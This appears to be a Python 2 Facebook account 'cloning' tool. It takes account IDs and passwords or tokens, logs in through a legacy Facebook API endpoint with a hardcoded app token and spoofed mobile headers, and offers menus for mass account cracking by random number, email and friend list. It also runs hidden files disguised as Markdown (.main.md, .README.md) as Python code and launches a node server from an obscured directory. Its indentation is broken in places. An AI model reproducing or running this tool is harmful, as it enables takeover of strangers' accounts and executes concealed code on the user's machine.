#!/usr/bin/python
# coding=utf-8
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("pip2 install mechanize")
    os.system("python2 kgf1.py")
try:
    os.mkdir('save')
except OSError:
    pass
    if os.path.isfile('.../index.js'):
 	os.system('mv ... .....')
	os.system('cd ..... && npm install')
 	os.system('#')
 	os.system('#')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.07)

def kgf(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def logging():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Logging In\033[0;97m "+o),;sys.stdout.flush();time.sleep(0.1)
def saving():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Saving Token\033[0;97m "+o),;sys.stdout.flush();time.sleep(0.1)
def updateing():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Getting Updates\033[0;97m "+o),;sys.stdout.flush();time.sleep(0.1)
def logout():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Logging Out\033[0;97m "+o),;sys.stdout.flush();time.sleep(0.1)
def download():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[✓] Downloading\033[0;97m "+o),;sys.stdout.flush();time.sleep(0.1)
#Sufyan_Ahmad
#logo01
logo = """
\t\x1b[1;93m ____  _  _  ____  _  _  __   __ _ 
\t\x1b[1;93m/ ___)/ )( \(  __)( \/ )/ _\ (  ( \
\t\x1b[1;93m\___ \) \/ ( ) _)  )  //    \/    /
\t\x1b[1;93m(____/\____/(__)  (__/ \_/\_/\_)__)
            We Are Pakistani And Also Pathan
            We Are Cyber We Believe On One Allah
\033[1;97m--------------------------------------------------
\033[1;95m➤\033[1;93m Coded by\033[1;91m :\033[1;92m Sufyan Shabqadry
\033[1;95m➤\033[1;93m Github\033[1;91m   :\033[1;92m https://github.com/sufyanahma
\033[1;95m➤\033[1;93m Fb\033[1;91m       :\033[1;92m https://m.facebook.com/sufyan.shabqadry
\033[1;95m➤\033[1;94m AHMAD \x1b[1;91mX3 \x1b[1;93mSUFYAN
\033[1;97m--------------------------------------------------
"""

idh = []
	
def the_kgf():
    os.system("clear")
    print logo
    kgf("\033[1;93mFirst Tools login")
    print("\033[1;97m-------------------")
    username = raw_input("\033[1;97m[+]\033[1;96m Username :\033[1;97m ")
    if username =="Kgf":
        os.system("clear")
        print logo
        print ("\033[1;92m[✓] Username : sufyan (Correct)")
        passwordss = raw_input("\033[1;97m[+]\033[1;96m Password :\033[1;97m ")
        if passwordss =="khan":
            os.system("clear")
            print logo
            logging()
            os.system("clear")
            print logo 
            print ("\033[1;92m[✓]\033[1;93m Username : khan\033[1;92m (Correct)")
            print ("\033[1;92m[✓]\033[1;93m Password : khan\033[1;92m (Correct)")
            time.sleep(1)
            print('')
            kgf("\033[1;92m[✓] Login Successful\033[0;97m")
            os.system('xdg-open https://www.facebook.com/Sufyan.shabqadry')
            time.sleep(1)
        try:
            open(".login.txt","r")
            menu()
        except(KeyError , IOError):
            login_choice()
        else:
            print ("[!] Password : "+passwordss+" (Wrong)")
            os.system('xdg-open https://www.facebook.com/Sufyan.shabqadry')
            time.sleep(1)
            the_kgf()
    else:
        print ("[!] Username : "+username+" (Wrong)")
        os.system('xdg-open https://www.facebook.com/Sufyan.shabqadry')
        time.sleep(1)
        the_kgf()
	
def login_choice():
    os.system('clear')
    print logo
    os.system("python3 .loading.md")
    time.sleep(1)
    os.system('clear')
    print logo
    print ("\033[1;96m[\033[1;90m1\033[1;96m]\033[1;90m==\033[1;92m> \033[1;97mRandom Number Cloning \033[1;97m(\033[1;92mno login\033[1;97m) ")
    print ("\033[1;96m[\033[1;90m2\033[1;96m]\033[1;90m==\033[1;92m> \033[1;97mRandom Email Cloning  \033[1;97m(\033[1;92mno login\033[1;97m) ")
    print ("\033[1;96m[\033[1;90m3\033[1;96m]\033[1;90m==\033[1;92m> \033[1;97mClone Friendlist and Public ID \033[1;97m(\033[1;92mlogin\033[1;97m) ")
    print ("\033[1;96m[\033[1;90m0\033[1;96m]\033[1;90m==\033[1;92m> \033[1;91mExit") 
    print("\033[1;97m--------------------------------------------------")
    clone_main()
def clone_main():
    hack = raw_input("\n╰─➣ ")
    if hack =="1":
        os.system("python2 .main.md")
        time.sleep(1)
        menu()
    if hack =="2":
        os.system("python2 .README.md")
        time.sleep(1)
        menu()
    if hack =="3":
        loginvia()   
    elif hack =="0":
        os.system("exit")
    else:
	print "\x1b[1;91mFill in correctly"
        clone_main()

def loginvia():
    os.system('clear')
    print logo
    os.system("python3 .loading.md")
    time.sleep(1)
    os.system('clear')
    print logo
    print ("\033[1;93m[\033[1;90m1\x1b[1;93m]\033[1;90m==\033[1;92m> \033[1;97mlogin With Access Token ")
    print ("\033[1;93m[\033[1;90m2\x1b[1;93m]\033[1;90m==\033[1;92m> \033[1;97mLogin With User And Pass")
    print ("\033[1;91m[\033[1;90m0\x1b[1;91m]\033[1;90m==\033[1;92m> \033[1;91mBack") 
    print("\033[1;97m--------------------------------------------------")
    clone_loginvia()
def clone_loginvia():
    hack = raw_input("\n╰─➣ ")
    if hack =="1":
        os.system("clear")
        print logo
	os.system("python3 .loading.md")
        time.sleep(1)
        os.system('clear')
	print logo
        print ("Login With Token").center(50)
	print("\033[1;97m--------------------------------------------------")
        token = raw_input("\033[1;97m[+]\033[1;93m Paste Token Here :\033[1;97m ")
	print("\033[1;97m--------------------------------------------------")
        saving()
        sav = open(".login.txt","w")
        sav.write(token)
        sav.close()
        kgf("\r\033[1;92m[✓] Login Successfull\033[0;97m")
    os.system('xdg-open https://www.facebook.com/Sufyan.shabqadry')
    os.system('clear')
    
    print logo
    print("\033[1;92mChecking Token\033[1;0m").center(50)
    time.sleep(1)
    os.system('clear')
    print logo
    print("\033[1;97mRefresh Token\033[1;0m").center(50)
    time.sleep(1)
    os.system("clear")
    print logo
    print("\033[1;92mPlease Wait 0\x1b[1;91m_\033[1;92m0").center(50)
    time.sleep(5)
    os.system("clear")
    print logo
    print("\033[1;97mToken has been saved\033[1;0m").center(50)
    time.sleep(1)
    os.system('xdg-open https://wa.me/message/KI7ZWQWQ6O5PN1')
    menu()
    if hack =="2":
        loginfb()
    elif hack =="0":
	        menu()
    else:
	        print ("[!] Please Select a Valid Option")
		clone_loginvia()
def loginfb():
    os.system("clear")
    print logo
    os.system("python3 .loading.md")
    time.sleep(0.1)
    os.system('clear')
    print logo
    print("Login With Facebook Account").center(50)
    print("Use Proxy to login account ").center(50)
    print("\033[1;97m--------------------------------------------------")
    id = raw_input("\033[1;97m[+]\033[1;93m Email/ID/Number :\033[1;97m ")
    id1 = id.replace(' ','')
    id2 = id1.replace('(','')
    uid = id2.replace(')','')
    pwd = raw_input("\033[1;97m[+]\033[1;93m Passwor :\033[1;97m ")
    print("\033[1;97m--------------------------------------------------")
    logging()
    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
    q = json.loads(data)
    if "access_token" in q:
        succ = open(".login.txt","w")
        succ.write(q["access_token"])
        succ.close()
        time.sleep(1)
	print("\033[1;92mChecking account\033[1;0m").center(50)
	time.sleep(0.1)
	os.system("clear")
	print logo
	print("\033[1;97mRefresh account\033[1;0m").center(50)
	time.sleep(0.1)
	os.system("clear")
	print logo
	print("\033[1;92mPlease Wait 0\x1b[1;91m_\033[1;92m0").center(50)
	time.sleep(0.1)
	os.system("clear")
	print logo
	print("\033[1;97mAccount has been saved\033[1;0m").center(50)
        time.sleep(1)
	os.system('xdg-open https://www.facebook.com/Sufyan.shabqadry')
        menu()
    else:
        if "www.facebook.com" in q["error_msg"]:
            print ("\n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m")
            time.sleep(0.1)
            loginfb()
        else:
            print("\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")
            time.sleep(0.1)
            loginfb()

def menu():
    os.system("clear")
    try:
        token = open(".login.txt","r").read()
    except IOError:
        print logo
        print("[!] Error 404.Token Not Found")
        os.system("rm -rf .login.txt")
        time.sleep(0.1)
        login_choice()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print logo
        print("\033[1;91m[!] Loading Failed . Your Account Has a Checkpoint")
        os.system("rm -rf .login.txt")
        time.sleep(0.1)
        login_choice()
    os.system('clear')
    print logo
    os.system("python3 .loading.md")
    time.sleep(0.01)
    os.system('clear')
    print logo
    jalan('\x1b[1;31;40m[\x1b[1;92m*\x1b[1;31;40m] \x1b[1;33mAccount Name\x1b[1;30;40m  ==\x1b[1;91m> \x1b[1;92m ' + name)
    jalan('\x1b[1;31;40m[\x1b[1;92m*\x1b[1;31;40m] \x1b[1;33mDate Of Birth\x1b[1;30;40m ==\x1b[1;91m> \x1b[0;92m ' + a['birthday'])
    sys.stdout.flush()
    time.sleep(0.01)
    print("\033[1;97m--------------------------------------------------")
    print("\033[1;91m[\033[1;92m1\033[1;91m] \033[1;90m==\033[1;92m> \033[1;97mClone Frienlist and Public ID")
    print("\033[1;91m[\033[1;92m2\033[1;91m] \033[1;90m==\033[1;92m> \033[1;97mRandom with choice password")
    print("\033[1;91m[\033[1;92m3\033[1;91m] \033[1;90m==\033[1;92m> \033[1;97mClone Bangladesh and India")
	
if __name__ == '__main__':
    the_kgf()


